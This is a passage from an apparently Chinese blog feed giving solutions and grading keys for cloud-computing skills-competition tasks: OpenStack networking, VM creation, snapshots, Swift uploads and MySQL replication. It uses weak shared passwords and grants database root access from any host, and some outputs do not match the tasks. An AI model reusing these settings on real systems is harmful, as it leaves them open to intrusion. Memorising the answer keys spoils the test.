class="line"><span class="comment"># 查看指定栈的详细信息</span></span><br><span class="line">[root@controller ~]# openstack stack show m1_flavor_stack</span><br><span class="line">+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Field                 | Value                                                                                                                          |</span><br><span class="line">+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| <span class="built_in">id</span>                    | 5a4b1816-aaf6-4739-83e5-4001c80d89d1                                                                                           |</span><br><span class="line">| stack_name            | m1_flavor_stack                                                                                                                |</span><br><span class="line">| description           | Create Flavor                                                                                                                  |</span><br><span class="line">| creation_time         | 2022-04-10T10:31:32Z                                                                                                           |</span><br><span class="line">| updated_time          | None                                                                                                                           |</span><br><span class="line">| stack_status          | CREATE_COMPLETE                                                                                                                |</span><br><span class="line">| stack_status_reason   | Stack CREATE completed successfully                                                                                            |</span><br><span class="line">| parameters            | OS::project_id: d27d72c12d3b46b89572df53a71e5d04                                                                               |</span><br><span class="line">|                       | OS::stack_id: 5a4b1816-aaf6-4739-83e5-4001c80d89d1                                                                             |</span><br><span class="line">|                       | OS::stack_name: m1_flavor_stack                                                                                                |</span><br><span class="line">|                       |                                                                                                                                |</span><br><span class="line">| outputs               | - description: Get the information of virtual machine <span class="built_in">type</span>                                                                     |</span><br><span class="line">|                       |   output_key: flavor_info                                                                                                      |</span><br><span class="line">|                       |   output_value:                                                                                                                |</span><br><span class="line">|                       |     OS-FLV-DISABLED:disabled: <span class="literal">false</span>                                                                                            |</span><br><span class="line">|                       |     OS-FLV-EXT-DATA:ephemeral: 0                                                                                               |</span><br><span class="line">|                       |     disk: 20                                                                                                                   |</span><br><span class="line">|                       |     <span class="built_in">id</span>: <span class="string">&#x27;1234&#x27;</span>                                                                                                                 |</span><br><span class="line">|                       |     links:                                                                                                                     |</span><br><span class="line">|                       |     - href: http://controller:8774/v2.1/flavors/1234                                                                           |</span><br><span class="line">|                       |       rel: self                                                                                                                |</span><br><span class="line">|                       |     - href: http://controller:8774/flavors/1234                                                                                |</span><br><span class="line">|                       |       rel: bookmark                                                                                                            |</span><br><span class="line">|                       |     name: m1.flavor                                                                                                            |</span><br><span class="line">|                       |     os-flavor-access:is_public: <span class="literal">true</span>                                                                                           |</span><br><span class="line">|                       |     ram: 1024                                                                                                                  |</span><br><span class="line">|                       |     rxtx_factor: 1.0                                                                                                           |</span><br><span class="line">|                       |     swap: <span class="string">&#x27;&#x27;</span>                                                                                                                   |</span><br><span class="line">|                       |     vcpus: 1                                                                                                                   |</span><br><span class="line">|                       |                                                                                                                                |</span><br><span class="line">| links                 | - href: http://controller:8004/v1/d27d72c12d3b46b89572df53a71e5d04/stacks/m1_flavor_stack/5a4b1816-aaf6-4739-83e5-4001c80d89d1 |</span><br><span class="line">|                       |   rel: self                                                                                                                    |</span><br><span class="line">|                       |                                                                                                                                |</span><br><span class="line">| parent                | None                                                                                                                           |</span><br><span class="line">| disable_rollback      | True                                                                                                                           |</span><br><span class="line">| deletion_time         | None                                                                                                                           |</span><br><span class="line">| stack_user_project_id | 374ce98267964767adacf91527ac0412                                                                                               |</span><br><span class="line">| capabilities          | []                                                                                                                             |</span><br><span class="line">| notification_topics   | []                                                                                                                             |</span><br><span class="line">| stack_owner           | None                                                                                                                           |</span><br><span class="line">| timeout_mins          | None                                                                                                                           |</span><br><span class="line">| tags                  | None                                                                                                                           |</span><br><span class="line">+-----------------------+--------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>3．在openstack私有云平台上，通过使用命令创建云主机外部网络extnet，子网extsubnet，虚拟机浮动 IP 网段为192.168.x.0&#x2F;24（其中x是考位号）， 网关为192.168.x.1，网络使用vlan模式；创建云主机内网intnet，子网intsubnet，虚拟机子网 IP 网段为10.0.x.0&#x2F;24（其中x是考位号），网关为10.0.x.1；完成内网子网intsubnet和外部网络extnet的连通。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#创建网络</span></span><br><span class="line">openstack network create extnet --provider-network-type vlan --external --provider-physical-network provider </span><br><span class="line"><span class="comment">#绑定子网</span></span><br><span class="line"> openstack subnet create extsubnet --network extnet  --dhcp --gateway 192.168.200.1 --allocation-pool start=192.168.200.100,end=192.168.200.200 --subnet-range 192.168.200.0/24</span><br><span class="line"><span class="comment">#创建内网</span></span><br><span class="line">openstack network create intnet --internal</span><br><span class="line"><span class="comment">#绑定子网</span></span><br><span class="line">openstack subnet create intsubnet --network intnet  --dhcp --gateway 10.10.200.1 --allocation-pool start=10.10.200.100,end=10.10.200.200 --subnet-range 10.10.200.0/24</span><br><span class="line"><span class="comment">#创建路由</span></span><br><span class="line">openstack router create ext-router  --<span class="built_in">enable</span></span><br><span class="line">openstack router <span class="built_in">set</span> --<span class="built_in">enable</span> --enable-snat --external-gateway extnet ext-router</span><br><span class="line"><span class="comment">#子网连通</span></span><br><span class="line">openstack router add subnet ext-router intsubnet</span><br></pre></td></tr></table></figure>

<p>4．在openstack私有云平台上，基于“cirros” 镜像、m1.flavor、 intsubnet的网络，绑定浮动IP，通过使用命令创建一台云主机VM1，启动VM1，并使用PC机能远程登录到VM1。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#若无法连接虚拟机vm1可能是外部网络的模式不正确。可以修改网络模式</span></span><br><span class="line"><span class="comment">#创建云主机</span></span><br><span class="line">nova boot --image cirros --flavor m1.flavor --nic net-name=intnet VM1 </span><br><span class="line"><span class="comment">#创建浮动ip</span></span><br><span class="line">openstack floating  ip create extnet</span><br><span class="line"><span class="comment">#查看浮动ip的id</span></span><br><span class="line">openstack floating ip list</span><br><span class="line"><span class="comment">#绑定</span></span><br><span class="line">openstack server add floating ip VM1 7bf5fa40-ec57-4abf-a666-b65082102a22</span><br></pre></td></tr></table></figure>

<p>5．在Controller节点中编写名为modvm.sh的shell脚本查看云主机VM1的内存大小，如果内存小于2G，调整云主机VM1的内存为2G。</p>
<p><strong>所有节点</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /etc/nova/nova.conf</span><br><span class="line">[DEFAULT]</span><br><span class="line">allow_resize_to_same_host=True</span><br><span class="line">scheduler_default_filters=RetryFilter,AvailabilityZoneFilter,RamFilter,ComputeFilter,ComputeCapabilitiesFilter,ImagePropertiesFilter,ServerGroupAntiAffinityFilter,ServerGroupAffinityFilter</span><br><span class="line"></span><br><span class="line"><span class="comment">#controller</span></span><br><span class="line">systemctl restart openstack-nova-api.service openstack-nova-scheduler.service openstack-nova-conductor.service openstack-nova-novncproxy.service</span><br><span class="line"><span class="comment">#compute</span></span><br><span class="line">systemctl restart libvirtd.service openstack-nova-compute.service</span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">source</span> /etc/keystone/admin-openrc.sh</span><br><span class="line">nova show VM1 | grep flavor:ram  &gt; a</span><br><span class="line">b=$(awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span> a)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$b</span>&quot;</span> -le <span class="string">&quot;2048&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    openstack server  resize VM1 --flavor centos</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;运行结束！&#x27;</span></span><br></pre></td></tr></table></figure>

<ol start="6">
<li><p>在openstack私有云平台上，将云主机VM1保存为qcow2格式的快照并保存到controller节点&#x2F;root&#x2F;cloudsave目录下。</p>
<p><strong>方法一</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">关闭云主机</span></span><br><span class="line">openstack server stop VM1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看云主机在那个节点上</span></span><br><span class="line">openstack server show VM1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入后端</span></span><br><span class="line">cd /var/lib/nova/instances/0aa53421-7363-415a-a08d-228023a6b857/</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建qcow2格式的快照</span></span><br><span class="line"> qemu-img convert -c -O qcow2 disk VM1.qcow2 -h</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">保存到/root/cloudsave目录下</span></span><br><span class="line"> mkdir /root/cloudsave</span><br><span class="line"> mv VM1.qcow2 /root/cloudsave</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash">查看详细信息</span></span><br><span class="line">  qemu-img info vm1.qcow2</span><br><span class="line">image: vm1.qcow2</span><br><span class="line">file format: qcow2</span><br><span class="line">virtual size: 20G (21474836480 bytes)</span><br><span class="line">disk size: 13M</span><br><span class="line">cluster_size: 65536</span><br><span class="line">Format specific information:</span><br><span class="line">    compat: 1.1</span><br><span class="line">    lazy refcounts: false</span><br><span class="line">    refcount bits: 16</span><br><span class="line">    corrupt: false</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>方法二</strong></p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭云主机</span></span><br><span class="line">openstack server stop VM1</span><br><span class="line"><span class="comment">#创建快照文件</span></span><br><span class="line">openstack server image create  VM1 --name demo</span><br><span class="line"><span class="comment">#将快照保存到/root/cloudsave</span></span><br><span class="line"><span class="built_in">mkdir</span> /root/cloudsave/</span><br><span class="line">openstack image save demo --file /root/cloudsave/demo.qcow2</span><br><span class="line"><span class="comment">#查看详细信息</span></span><br><span class="line">qemu-img info demo.qcow2</span><br><span class="line">image: demo.qcow2</span><br><span class="line">file format: qcow2</span><br><span class="line">virtual size: 20G (21474836480 bytes)</span><br><span class="line">disk size: 21M</span><br><span class="line">cluster_size: 65536</span><br><span class="line">Format specific information:</span><br><span class="line">    compat: 1.1</span><br><span class="line">    lazy refcounts: <span class="literal">false</span></span><br><span class="line">    refcount bits: 16</span><br><span class="line">    corrupt: <span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>7．在controller节点上新建名为Chinaskill的容器，并获取该容器的存放路径；将 centos7_5.qcow2 镜像上传到chinaskill容器中，并设置分段存放， 每一段大小为 10M。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#新建Chinaskill容器</span></span><br><span class="line">swift post Chinaskill</span><br><span class="line"><span class="comment">#上传镜像并分段存放</span></span><br><span class="line">swift upload Chinaskill -S 10485760 CentOS_7.5_x86_64_XD.qcow2</span><br><span class="line"><span class="comment">#查看信息</span></span><br><span class="line">swift <span class="built_in">stat</span> Chinaskill CentOS_7.5_x86_64_XD.qcow2</span><br><span class="line">               Account: AUTH_d58a1b0d053d4fd7ac1ddd98131973b3</span><br><span class="line">             Container: Chinaskill</span><br><span class="line">                Object: opt/openstack/images/CentOS_7.5_x86_64_XD.qcow2</span><br><span class="line">          Content Type: application/octet-stream</span><br><span class="line">        Content Length: 510459904</span><br><span class="line">         Last Modified: Wed, 12 Oct 2022 01:41:17 GMT</span><br><span class="line">                  ETag: <span class="string">&quot;7d5003b2fb7a024c3abd9510bf6198fa&quot;</span></span><br><span class="line">              Manifest: Chinaskill_segments/opt/openstack/images/CentOS_7.5_x86_64_XD.qcow2/1603918661.000000/510459904/10485760/</span><br><span class="line">            Meta Mtime: 1603918661.000000</span><br><span class="line">         Accept-Ranges: bytes</span><br><span class="line">           X-Timestamp: 1665538876.17294</span><br><span class="line">            X-Trans-Id: tx97c10bc263f64a93a2ea6-0063461dda</span><br><span class="line">X-Openstack-Request-Id: tx97c10bc263f64a93a2ea6-0063461dda</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>8． 登录172.17.x.10&#x2F;dashboard，使用centos7镜像创建三台云主机来搭建rabbitmq集群。使用普通集群模式，其中一台做磁盘节点，另外两台做内存节点，配置完毕后启动rabbitmq服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>9．使用镜像 centos7，创建两台云主机master和slave，并分别绑定浮动IP；在这2台云主机上安装mysql据库系统并配置为主从数据库（master为主节点、slave为从节点）；并mater云主机的数据库中创建ChinaSkilldb库，在ChinaSkilldb库中创建表testable (id int not null primary key,Teamname varchar(50), remarks varchar(255))，在表中插入记录(1,”Cloud”,”ChinaSkill”)。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#修改yum源</span></span><br><span class="line"><span class="built_in">mv</span> /etc/yum.repos.d/* /etc/yum</span><br><span class="line"><span class="built_in">cat</span> /etc/yum.repos.d/http.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://192.168.100.10/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://192.168.100.10/openstack/iaas-repo</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line"><span class="comment">#更新缓存区</span></span><br><span class="line">yum repolist</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改主机映射</span></span><br><span class="line"><span class="comment">#注意修改主机名</span></span><br><span class="line">10.10.200.101 master </span><br><span class="line">10.10.200.109 slave</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装mariadb所有节点</span></span><br><span class="line">yum install -y mariadb mariadb-server <span class="comment">#（安装数据库以及服务）</span></span><br><span class="line">systemctl start mariadb    <span class="comment">#（启动数据库） </span></span><br><span class="line">systemctl <span class="built_in">enable</span> mariadb   <span class="comment">#（设置开机自启）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#初始化数据库(所有节点)</span></span><br><span class="line">mysql_secure_installation</span><br><span class="line">   回车 y 123456 123456 y n y y</span><br><span class="line"><span class="comment">#修改主节点</span></span><br><span class="line"><span class="built_in">cat</span> /etc/my.cnf [mysqld] log_bin = mysql-bin <span class="comment">#记录操作日志 </span></span><br><span class="line">binlog_ignore_db = mysql <span class="comment">#不同步MySQL系统数据库 </span></span><br><span class="line">server_id = 18 <span class="comment">#数据库集群中的每个节点id都要不同 </span></span><br><span class="line">datadir=/var/lib/mysql </span><br><span class="line">socket=/var/lib/mysql/mysql.sock </span><br><span class="line">symbolic-links=0 </span><br><span class="line"><span class="comment">#从节点添加server_id（注意要不一致）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#重启服务</span></span><br><span class="line">systemctl restart mariadb</span><br><span class="line"></span><br><span class="line"><span class="comment">#主节点</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line"> <span class="comment">#授权在任何客户端机器上可以以 root用户登录到数据库</span></span><br><span class="line"> grant all privileges on *.* to root@<span class="string">&#x27;%&#x27;</span> identified by <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"> <span class="comment">#在主节点db1数据库上创建一个user用户让从节点db2连接</span></span><br><span class="line">  grant replication slave on *.* to <span class="string">&#x27;user&#x27;</span>@<span class="string">&#x27;db2&#x27;</span> identified by <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="comment">#从节点</span></span><br><span class="line">mysql -uroot -p123456</span><br><span class="line">change master to master_host=<span class="string">&#x27;db1&#x27;</span>,master_user=<span class="string">&#x27;user&#x27;</span>,master_password=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">start slave;</span><br><span class="line">show slave status\G <span class="comment">#Slave_IO_Running和Slave_SQL_Running的状态都为YES</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#主节点创建数据库</span></span><br><span class="line">create database Chinaskilldb; </span><br><span class="line">use  Chinaskilldb  ;</span><br><span class="line">create table testtable(<span class="built_in">id</span> int not null primary key,Teamname varchar(50), remarks varchar(255));</span><br><span class="line">insert into testtable values (1,<span class="string">&quot;Cloud&quot;</span>,<span class="string">&quot;ChinaSkill&quot;</span>);</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年金砖大赛</title>
    <url>/posts/a8884406.html</url>
    <content><![CDATA[<h1 id="A模块题目：OpenStack-平台部署与运维"><a href="#A模块题目：OpenStack-平台部署与运维" class="headerlink" title="A模块题目：OpenStack 平台部署与运维"></a>A模块题目：OpenStack 平台部署与运维</h1><p>业务场景：</p>
<p>某企业拟使用OpenStack搭建一个企业云平台，用于部署各类企业应用对外对内服务。云平台可实现IT资源池化、弹性分配、集中管理、性能优化以及统一安全认证等。系统结构如下图：</p>
<p>企业云平台的搭建使用竞赛平台提供的两台云服务器，配置如下表：</p>
<p>表1 IP地址规划</p>
<table>
<thead>
<tr>
<th>设备名称</th>
<th>主机名</th>
<th>接口</th>
<th>IP地址</th>
</tr>
</thead>
<tbody><tr>
<td>云服务器1</td>
<td>controller</td>
<td>eth0</td>
<td>公网IP: 私网IP:192.168.100.&#x2F;24</td>
</tr>
<tr>
<td></td>
<td></td>
<td>eth1</td>
<td>私网IP:192.168.200. *&#x2F;24</td>
</tr>
<tr>
<td>云服务器2</td>
<td>compute</td>
<td>eth0</td>
<td>公网IP: 私网IP:192.168.100. *&#x2F;24</td>
</tr>
<tr>
<td></td>
<td></td>
<td>eth1</td>
<td>私网IP:192.168.200. *&#x2F;24</td>
</tr>
</tbody></table>
<p>说明：</p>
<p>1.选手自行检查工位pc机硬件及网络是否正常；</p>
<p>2.竞赛使用集群模式进行，给每个参赛队提供华为云账号和密码及考试系统的账号和密码。选手通过用户名与密码分别登录华为云和考试系统；</p>
<p>3.竞赛用到的软件包都在云主机&#x2F;root下。</p>
<p>4.表1中的公网IP和私网IP以自己云主机显示为准，每个人的公网IP和私网IP不同。使用第三方软件远程连接云主机，使用公网IP连接。</p>
<h2 id="任务1-1私有云平台环境初始化（5-分）"><a href="#任务1-1私有云平台环境初始化（5-分）" class="headerlink" title="任务1 1私有云平台环境初始化（5 分）"></a>任务1 1私有云平台环境初始化（5 分）</h2><h3 id="1-配置主机名"><a href="#1-配置主机名" class="headerlink" title="1.配置主机名"></a>1.配置主机名</h3><p>​	把controller节点主机名设置为controller,compute 节点主机名设置为compute,修改hosts文件将IP地址映射为主机名</p>
<p> 在controller节点将cat &#x2F;etc&#x2F;hosts命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: controller&amp;&amp;compute&amp;&amp;192.168.100</strong></p>
<p>解法:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# hostnamectl set-hostname controller</span><br><span class="line">[root@localhost ~]# bash</span><br><span class="line">[root@localhost ~]# hostnamectl set-hostname compute</span><br><span class="line">[root@localhost ~]# bash</span><br><span class="line">[root@controller ~]# hostname</span><br><span class="line">controller</span><br><span class="line">[root@compute ~]# hostname</span><br><span class="line">compute</span><br><span class="line">[root@controller ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br><span class="line">[root@compute ~]# <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line">192.168.100.10 controller</span><br><span class="line">192.168.100.20 compute</span><br></pre></td></tr></table></figure>

<h3 id="2-挂载光盘镜像"><a href="#2-挂载光盘镜像" class="headerlink" title="2.挂载光盘镜像"></a>2.挂载光盘镜像</h3><p>在controller节点的root目录下有CentOS-7-x86_64-DVD-2009.iso和openstack-train.tar.gz，在&#x2F;opt下创建centos目录，将镜像文件CentOS-7-x86_64-DVD-2009.iso挂载到&#x2F;opt&#x2F;centos下，将openstack-train.tar.gz解压到&#x2F;opt目录下，并创建本地yum源local.repo。</p>
<p>在controller节点将yum list | grep glance命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: openstack-glance&amp;&amp;python2-glance&amp;&amp;python2-glance-store</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# mv /opt/CentOS-7-x86_64-DVD-2009.iso /root/</span><br><span class="line">[root@controller ~]# mkdir /opt/centos</span><br><span class="line">[root@controller ~]# tar -zxvf /root/openstack-train.tar.gz -C /opt/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行挂载</span></span><br><span class="line">[root@controller ~]# mount /root/CentOS-7-x86_64-DVD-2009.iso /opt/centos/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置controller 本地yum源</span></span><br><span class="line">[root@controller ~]# vim /etc/yum.repos.d/local.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=file:///opt/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=file:///opt/openstack</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[root@controller ~]# yum list | grep glance</span><br><span class="line">openstack-glance.noarch                    1:19.0.4-1.el7              openstack</span><br><span class="line">python2-glance.noarch                      1:19.0.4-1.el7              openstack</span><br><span class="line">python2-glance-store.noarch                1.0.1-1.el7                 openstack</span><br><span class="line">python2-glanceclient.noarch                1:2.17.1-1.el7              openstack</span><br></pre></td></tr></table></figure>

<h3 id="3-搭建ftp服务器"><a href="#3-搭建ftp服务器" class="headerlink" title="3.搭建ftp服务器"></a>3.搭建ftp服务器</h3><p>在controller节点上安装vsftp服务,将&#x2F;opt目录设为共享，并设置为开机自启动，然后重启服务生效；在compute节点创建FTP源ftp.repo，使用controller节点为FTP服务器，配置文件中的FTP地址使用主机名。</p>
<p>在compute节点将cat &#x2F;etc&#x2F;yum.repos.d&#x2F;ftp.repo命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: controller&#x2F;centos&amp;&amp;controller&#x2F;openstack</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装vsftpd</span></span><br><span class="line">[root@controller ~]# yum install vsftpd -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置/opt目录进行共享</span></span><br><span class="line">[root@controller ~]# echo anon_root=/opt &gt;&gt; /etc/vsftpd/vsftpd.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启并设置开机自启动</span></span><br><span class="line">[root@controller ~]# systemctl restart vsftpd</span><br><span class="line">[root@controller ~]# systemctl enable vsftpd</span><br><span class="line"></span><br><span class="line">[root@controller ~]# cat /etc/vsftpd/vsftpd.conf | grep /opt  </span><br><span class="line">anon_root=/opt</span><br><span class="line">[root@controller ~]# systemctl status vsftpd | grep -P Loaded\|Active</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/vsftpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Wed 2023-02-22 22:01:15 CST; 9min ago</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置compute ftp源</span></span><br><span class="line">[root@compute ~]# vim /etc/yum.repos.d/ftp.repo</span><br><span class="line">[centos]</span><br><span class="line">name=centos</span><br><span class="line">baseurl=ftp://controller/centos</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br><span class="line">[openstack]</span><br><span class="line">name=openstack</span><br><span class="line">baseurl=ftp://controller/openstack</span><br><span class="line">gpgcheck=0</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>

<h3 id="4-分区"><a href="#4-分区" class="headerlink" title="4.分区"></a>4.分区</h3><p>在compute节点将vdb分为两个区分别为vdb1和vdb2,大小自定义(如果是sdb,则分为sdb1和sdb2)。要求分区格式为gpt,使用mkfs.xfs命令对文件系统格式化。</p>
<p>将lsblk -f命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: db1&amp;&amp;db2&amp;&amp;xfs</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@compute ~]# parted /dev/vdb mklabel gpt</span><br><span class="line">Information: You may need to update /etc/fstab.</span><br><span class="line">[root@compute ~]# parted /dev/vdb</span><br><span class="line">(parted) mkpart        </span><br><span class="line">Partition name?  []? f1</span><br><span class="line">File system type?  [ext2]? xfs</span><br><span class="line">Start? 0G              </span><br><span class="line">End? 20G</span><br><span class="line"> (parted) mkpart</span><br><span class="line">Partition name?  []? f2</span><br><span class="line">File system type?  [ext2]? xfs</span><br><span class="line">Start? 20G             </span><br><span class="line">End? 100G</span><br><span class="line">(parted) quit</span><br><span class="line">[root@compute ~]# mkfs.xfs /dev/vdb1</span><br><span class="line">[root@compute ~]# mkfs.xfs /dev/vdb2</span><br><span class="line"></span><br><span class="line">[root@compute ~]# lsblk -f</span><br><span class="line">NAME   FSTYPE LABEL UUID                                 MOUNTPOINT</span><br><span class="line">vda                                                     </span><br><span class="line">└─sda1 xfs          5f1871e2-c19c-4f86-8d6c-04d5fda71a0a /</span><br><span class="line">sdb                                                     </span><br><span class="line">├─vdb1 xfs          91b262c1-1767-4968-9563-8174e3accdeb</span><br><span class="line">└─vdb2 xfs          721a62f9-a00b-4ddf-9454-24bb65090b8b</span><br></pre></td></tr></table></figure>

<h3 id="5-系统调优-脏数据回写"><a href="#5-系统调优-脏数据回写" class="headerlink" title="5.系统调优-脏数据回写"></a>5.系统调优-脏数据回写</h3><p>Linux系统内存中会存在脏数据，一般系统默认脏数据占用内存30%时会回写磁盘，修改系统配置文件，要求将回写磁盘的大小调整为60%。</p>
<p>在controller节点将sysctl -p命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: vm.dirty_ratio&amp;&amp;60</strong></p>
<p>解法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# echo vm.dirty_ratio = 60 &gt;&gt; /etc/sysctl.conf</span><br><span class="line"></span><br><span class="line">[root@controller ~]# sysctl -p</span><br><span class="line">vm.dirty_ratio = 60</span><br></pre></td></tr></table></figure>

<h2 id="任务2-OpenStack搭建任务-8分"><a href="#任务2-OpenStack搭建任务-8分" class="headerlink" title="任务2 OpenStack搭建任务 (8分)"></a>任务2 OpenStack搭建任务 (8分)</h2><h3 id="1-修改脚本文件"><a href="#1-修改脚本文件" class="headerlink" title="1.修改脚本文件"></a>1.修改脚本文件</h3><p>在controller节点和compute节点分别安装sh-guoji软件包，修改脚本文件基本变量（脚本文件为&#x2F;root&#x2F;variable.sh），修改完成后使用命令生效该脚本文件并替换到compute节点对应位置。</p>
<p>在controller节点请将echo $HOST_NAME $HOST_NAME_NODE命令的返回结果提交到答题框。【1分】</p>
<p><strong>标准: controller&amp;&amp;compute</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@controller ~]# yum install sh-guoji -y</span><br><span class="line">[root@compute ~]# yum install sh-guoji -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置</span></span><br><span class="line">[root@controller ~]# cat /root/variable.sh | grep -Ev &quot;^$|#&quot;                     </span><br><span class="line">HOST_IP=192.168.100.x</span><br><span class="line">HOST_PASS=000000</span><br><span class="line">HOST_NAME=controller</span><br><span class="line">HOST_IP_NODE=192.168.100.x</span><br><span class="line">HOST_PASS_NODE=000000</span><br><span class="line">HOST_NAME_NODE=compute</span><br><span class="line">network_segment_IP=192.168.100.0/24</span><br><span class="line">RABBIT_USER=openstack</span><br><span class="line">RABBIT_PASS=000000</span><br><span class="line">DB_PASS=000000</span><br><span class="line">ADMIN_PASS=000000</span><br><span class="line">DEMO_PASS=000000</span><br><span class="line">KEYSTONE_DBPASS=000000</span><br><span class="line">GLANCE_DBPASS=000000</span><br><span class="line">GLANCE_PASS=000000</span><br><span class="line">NOVA_DBPASS=000000</span><br><span class="line">NOVA_PASS=000000</span><br><span class="line">NEUTRON_DBPASS=000000</span><br><span class="line">NEUTRON_PASS=000000</span><br><span class="line">METADATA_SECRET=000000</span><br><span class="line">INTERFACE_IP_HOST=192.168.100.x</span><br><span class="line">INTERFACE_IP_NODE=192.168.100.x</span><br><span class="line">INTERFACE_NAME_HOST=eth0</span><br><span class="line">INTERFACE_NAME_NODE=eth0</span><br><span class="line">Physical_NAME=provider</span><br><span class="line">minvlan=100</span><br><span class="line">maxvlan=200</span><br><span class="line">CINDER_DBPASS=000000</span><br><span class="line">CINDER_PASS=000000</span><br><span class="line">BLOCK_DISK=vdb1</span><br><span class="line">SWIFT_PASS=000000</span><br><span class="line">OBJECT_DISK=vdb2</span><br><span class="line">STORAGE_LOCAL_NET_IP=192.168.100.x</span><br><span class="line">HEAT_DBPASS=000000</span><br><span class="line">HEAT_PASS=000000</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制到compute节点</span></span><br><span class="line">[root@controller ~]# scp /root/variable.sh compute:/root/</span><br><span class="line">[root@controller ~]# source /root/variable.sh</span><br><span class="line"></span><br><span class="line">[root@controller ~]# echo $HOST_NAME $HOST_NAME_NODE</span><br><span class="line">controller compute</span><br></pre></td></tr></table></figure>

<h3 id="2-安装openstack基础组件"><a href="#2-安装openstack基础组件" class="headerlink" title="2.安装openstack基础组件"></a>2.安装openstack基础组件</h3><p>分别在controller节点和compute节点执行openstack-completion.sh文件(执行完闭需重连终端)。</p>
<p>在controller节点将openstack –version命令的返回结果提交到答题框。【1分】</p>
